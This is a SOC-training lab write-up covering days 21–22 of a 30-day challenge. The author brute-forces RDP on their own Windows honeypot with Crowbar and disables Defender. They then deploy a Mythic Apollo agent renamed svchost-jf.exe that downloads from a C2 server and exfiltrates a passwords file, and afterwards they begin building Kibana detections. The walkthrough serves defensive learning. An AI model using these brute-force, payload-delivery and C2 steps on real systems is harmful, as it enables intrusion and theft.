*This project is under construction.*
# MyDFIR 30 Day SOC Analyst Challenge (Part 5)

<img width="896" alt="Part 5 Header" src="https://github.com/user-attachments/assets/167d3e80-f73a-48f7-9bbe-b7b8792f367b" />

## Day 21: Mythic Agent Steup
Today's task will demonstrate how to perform a brute force attack, generate a Mythic agent, and establish a Command-and-Control session from a Windows server. This attack follows the attack diagram created on Day 19. However, there are a few things to prepare before initiating the attack. 

First, I created a fake `passwords.txt` file located on my Windows server. Within this text file is the password honeypot2024!.
<img width="961" alt="day21-1" src="https://github.com/user-attachments/assets/68b472bf-51a3-429e-8009-bc0fc9298c57" />

Next, I want change the password to this Windows server to honeypot2024! To do this, navigate to `Start menu > User name > Change account settings > Sign-in options > Password > Change`. 
<img width="959" alt="day21-2a" src="https://github.com/user-attachments/assets/5f2c3b3f-6583-4669-b89a-fabc33d02008" />

After entering the current password and new password, I found that this new password, honeypot2024!, did not meet the password policy requirements. Not a problem. I just needed to edit the group policy by changing the minimum password length and disable the requirement to meet password complexity. To do this, navigate to `Edit group policy` by typing `local group` in the search bar.
<img width="959" alt="day21-2d" src="https://github.com/user-attachments/assets/95b45bd0-ce15-4662-8970-8bf9665ce5fa" />

<img width="960" alt="day21-2e" src="https://github.com/user-attachments/assets/97466b96-76f4-4d9c-a220-4c575a4539d9" />

<img width="970" alt="day21-2f" src="https://github.com/user-attachments/assets/1920ceb7-cdc8-4960-ac54-4ba71bf33c08" />

<img width="957" alt="day21-2g" src="https://github.com/user-attachments/assets/5ce567f1-098b-4a76-a35a-1bd19728ba6a" />

<img width="897" alt="day21-2h" src="https://github.com/user-attachments/assets/f12fcd80-9810-4074-bbed-db92b22baaeb" />

Once those two changes were made to the group policy, I successfully updated the password to honeypot2024!.

Now that I have created the `passwords.txt` file and updated the account password on the Windows server, it is time to move onto to phase one of the attack. 

#### Phase 1: Initial Access
The goal of phase 1 is to gain access to the target machine using a common brute force attack tool to crack the password for the Administrator account.

To initiate the attack, I will utilize a Kali Linux machine. Kali Linux comes preloaded with a vast array of tools for various cybersecurity tasks, including tools for network analysis, web application testing, password cracking, wireless testing, reverse engineering, and more. 

There are several preexisting wordlists within Kali Linux found in `/usr/share/wordlists/`. This attack will utilize the rockyou.txt file. To unzip the file, run `sudo gunzip rockyou.txt.gz` and enter the default password `kali`.
<img width="954" alt="day21-3a" src="https://github.com/user-attachments/assets/87413db2-acee-4cda-bff1-94716d60a623" />

Running `cat rockyou.txt` will show all the list of commonly used passwords contained in the file. I only want to use the first 50 passwords listed in the file. To do this, I need to create a separate list, which will be in a file titled mydfir-wordlist.txt, by running `head -50 rockyou.txt > /home/kali/mydfir-wordlist.txt`. This command works by listing out the first 50 passwords in the `rockyou.txt` file and outputting those into a new file called `mydfir-wordlist.txt`.
<img width="959" alt="day21-3b" src="https://github.com/user-attachments/assets/6b57f7bb-4b06-4838-b48a-feb039798b93" />

Now, it's necessary to include honeypot2024! in the `mydfir-wordlist.txt` file. To do so, run `nano mydfir-wordlist.txt` to open the file in the Nano text editor. [Here](https://youtu.be/g2PU--TctAM) is a short video on the basics of using Nano.
<img width="959" alt="day21-3c" src="https://github.com/user-attachments/assets/9a128a53-159b-4cdd-b1b6-763144712c72" />

A tool called [Crowbar](https://github.com/galkan/crowbar) is going to do the brute forcing. After updating and upgrading the system repositories, to download the tool, run `sudo apt-get install -y crowbar`. Once installed, I ran the command `crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s 45.32.40.253/32` to initiate the attack. Let's break this command down:
* `crowbar`specifies the tool to be used.
* The `-b` flag specifies the type of brute-force attack. (RDP)
* The `-u` flag specifies what username to use during the attack. (Administrator)
* The `-c` flag specifies the path to a wordlist file containing passwords to be tried. (mydfir-wordlist.txt)
* The `-s` flag specifies the target IP address. (45.32.40.253/32)

From the screen shot below, we can see that it only took 10 seconds for Crowbar to crack the password.

Now, to authenticate into the Windows server, RDP into the server with `xfreerdp` by running `xfreerdp /u:Administrator /p:honeypot2024! /v:45.32.40.253:3389`. This command initiates an RDP session by logging into the server at the specified IP address using port `3389`, which is the default port for RDP, using the username `Administrator` and password `honeypot2024!`.
<img width="955" alt="day21-5" src="https://github.com/user-attachments/assets/82af3a43-2b41-4093-b582-c93d285e61a3" />

#### Phase 2: Discovery
Phase 2 is all about gathering critical information about the target environment. The goal is to identify as many assets, systems, and configurations as possible to better understand the network and determine how to proceed.

Some basic discovery commands iclude:
* `whoami`: provides information about the currently logged-in user.
* `ipconfig`: provides detailed information about the network configuration of a Windows system.
<img width="956" alt="day21-5b" src="https://github.com/user-attachments/assets/e8262b50-262c-4cd9-b215-b5335523ec1c" />
* `net user`: provides information about user accounts on a Windows system.
* `net user username`: provides detailed information about the specified user account.
* `net group`: provides information about and manages group accounts in a Windows domain.
<img width="958" alt="day21-5c" src="https://github.com/user-attachments/assets/59f255b0-0893-4ae7-bea6-ad0065b12ad3" />

#### Phase 3: Defense Evasion
The goal of defense evasion is to avoid detection by the target's security systems and maintain stealthy access to the compromised environment. It focuses on bypassing or disabling security measures to prolong the attack and minimize the chance of discovery.

In this case, I disable Windows Defender via the GUI. 
<img width="954" alt="day21-6" src="https://github.com/user-attachments/assets/2219b1fc-522c-495c-9061-4aa84f1266fe" />

In a more advanced, real-world scenario, in addition to avoiding detection by security tools, attackers may also take measures to obfusicate or masquerade their activity, establish persistence, or even clean up any evidence of their existence.

#### Phase 4: Execution
This phase  focuses on running malicious commands, scripts, or payloads on the compromised system. This phase is pivotal as it enables attackers to achieve their objectives, such as establishing control, gathering information, or preparing for further stages of the attack. Here, I set up a persistent and reliable connection to the C2 infrastructure under my control.

First, I need to set up an agent within my Mythic instance. Working from my Mythic server, I downloaded and installed the [Apollo Mythic agent](https://github.com/MythicAgents/Apollo.git) from GitHub by running `./mythic-cli install github https://github.com/MythicAgents/Apollo.git`. 
<img width="961" alt="day21-7a" src="https://github.com/user-attachments/assets/033358e1-99e0-4f21-9d84-55fc656e88da" />

This [Agent Capabilities Matrix](https://mythicmeta.github.io/overview/agent_matrix.html) is a useful resource for determining which agent is good dependent upon operational conditions.

After a few moments, I can see from PowerShell and my Mythic web GUI that Apollo has been successfully installed.
<img width="948" alt="day21-7b" src="https://github.com/user-attachments/assets/704efa94-868b-4b59-9e85-873381aeee1a" />
<img width="959" alt="day21-7c" src="https://github.com/user-attachments/assets/b29f3454-5bca-4604-8069-dd039d81f3ca" />

Next, a C2 profile is needed. [This GitHub repository](https://github.com/MythicC2Profiles) contains all the information needed to set up the profile. In this case, I am using the http profile.
![image](https://github.com/user-attachments/assets/059f8f45-0b0c-49d2-9ee0-92c420a9254a)
![image](https://github.com/user-attachments/assets/9c31917f-f72e-46b7-980f-c11e47a77592)
![image](https://github.com/user-attachments/assets/afdee3c4-5c9a-4f58-8c78-46666a8c5e58)

To install the http C2 profile, I ran `./mythic-cli install github https://github.com/MythicC2Profiles/http`. 
<img width="960" alt="day21-8a" src="https://github.com/user-attachments/assets/83c5cf49-8b78-4f26-9872-b7f8c1d911f3" />

Returning to my Mythic web GUI, I now see an Agent and C2 Profile.
<img width="960" alt="day21-8c" src="https://github.com/user-attachments/assets/9440e97c-66cf-4f26-b546-891150cb3507" />

To create a payload, navigate to the biohazard icon and choose `Actions > Generate new payload`. 
<img width="959" alt="day21-9" src="https://github.com/user-attachments/assets/62fc03a9-bc9a-420f-bf9a-4d5ccec30e9d" />

Now, Mythic will guide you through the steps to create the payload. First, select the designated target system.
<img width="962" alt="day21-9a" src="https://github.com/user-attachments/assets/7bb2bd1c-243d-4745-8346-92f6e402e62b" />

Then, there are several options as how to output the payload (shellcode, executable, service).
<img width="958" alt="day21-9b" src="https://github.com/user-attachments/assets/5c23f153-3bf6-4f90-9fc8-d6ea17ca5ba1" />

A nice feature of Mythic is that it provides you with the available commands for use allowing for greater customization. You can also click on the `Documentation` button to learn more about each command.
<img width="958" alt="day21-9c" src="https://github.com/user-attachments/assets/5d6ad7b1-57c1-4233-abc9-ac2e48db997c" />

Next, it is necessary to provide your Mythic server's public IP address as the callback address. After all, we want to be notified about what is going on.
<img width="961" alt="day21-9d" src="https://github.com/user-attachments/assets/1b850c1d-1fc4-4f1a-9912-13acce430ff0" />

Finally, name and describe the payload.
<img width="958" alt="day21-9e" src="https://github.com/user-attachments/assets/88d4e404-d793-45a8-9086-3a86fe9e80d9" />

#### Phase 5: Command and Control
This is the pivotal moment of many C2 attacks. Here we will establish and maintain a communication channel between the attacker and the compromised system. 

The payload is ready to be downloaded. I ran the `wget` command in PowerShell from the Mythic server using the download link provided by Mythic. An error occurs but is easily resolved by adding `--no-check-certificate` to the end of the command.
<img width="959" alt="day21-9f" src="https://github.com/user-attachments/assets/dbdcc0a5-619f-4dbb-bc26-96efab1b2dba" />

Now, the file is available and I can see that it is a PE32 executable. I also renamed the file to `svchost-jf.exe` and moved it to the newly created `1` directory.
<img width="961" alt="day21-9g" src="https://github.com/user-attachments/assets/de61a724-d511-41b8-97a6-cb58cc6f0d59" />

Utilizing an HTTP module that python offers to provide the necessary framework and functionality to facilitate communication, data exchange, and execution over the HTTP protocol. 
<img width="960" alt="day21-10" src="https://github.com/user-attachments/assets/99b5e182-31ac-46e9-891c-696f0556150d" />

Moving back to the previously established RDP session on the Kali Linux machine, I invoked a web request to download the payload.
<img width="958" alt="day21-10a" src="https://github.com/user-attachments/assets/43c6aa4e-2b20-44da-b205-52fe422fd64e" />

Now, running `./svchost-jf.exe`, will establish a connection with my Mythic agent. Moving over to my Mythic web GUI, I can see that I now have an active callback.
<img width="962" alt="day21-10b" src="https://github.com/user-attachments/assets/1a4689a4-2f1e-4189-8641-13197c4dc6df" />

#### Phase 6: Exfiltration
The exfiltration stage is often the primary objective in many cyberattacks, particularly those driven by espionage, fraud, or ransomware. Successful exfiltration allows the attacker to capitalize on the stolen data, whether for financial gain, competitive advantage, or further malicious actions. Additionally, it can significantly harm the targeted organization in terms of financial loss, reputation damage, and regulatory consequences.

Now that C2 has been established, I have the ability to execute commands on the target machine from my Mythic web GUI.
<img width="962" alt="day21-10b" src="https://github.com/user-attachments/assets/b0dc3abc-43a8-4d8b-88b0-25ef6cc91cb2" />

To download a file from the target machine, run `download file path`. To download the `passwords.txt` file that was created, I ran `download C:\Users\Administrator\Documents\passwords.txt`. I can even see a preview of the documents data.
<img width="958" alt="day21-10c" src="https://github.com/user-attachments/assets/b7a2f719-02dd-460f-9efa-6f782b4f23f6" />

To view the entire document and a list of other downloaded files, navigate to the paperclip icon located on the top toolbar.
<img width="958" alt="day21-10d" src="https://github.com/user-attachments/assets/8c73a11f-1c5c-483b-bbe5-ee932665b75f" />

#### Summary
Today's task demonstrated the process of performing a brute force attack, establishing a Command-and-Control (C2) session, and exfiltrating data from a compromised Windows server. The attack proceeded through several key phases, starting with gaining initial access using Crowbar and continuing with discovery, defense evasion, and the execution of malicious payloads using Mythic. Once control was established, we used the Mythic agent to set up a reliable C2 channel and exfiltrated sensitive data from the target system. This exercise highlights the importance of each phase in a C2 attack, emphasizing how attackers can infiltrate, control, and extract critical information from a vulnerable network. Finally, Mythic is a powerful framework. Please use it responsibly.

## Day 22: Creating Alerts & Dashboards in Kibana (4/4)
Now that the Mythic agent is up and running, I want to create an alert that will capture the generated telemetry and visualize it with an associated dashboard.

Returning to the Elastic web GUI, under the hamburger menu, navigate to `Analytics > Discover`. To locate the C2 telemetry, I search for the payload I created and deployed yesterday, called `svchost-jf.exe`. In a real-world scenario, this information wouldn't be readily available, but this is for educational purposes.

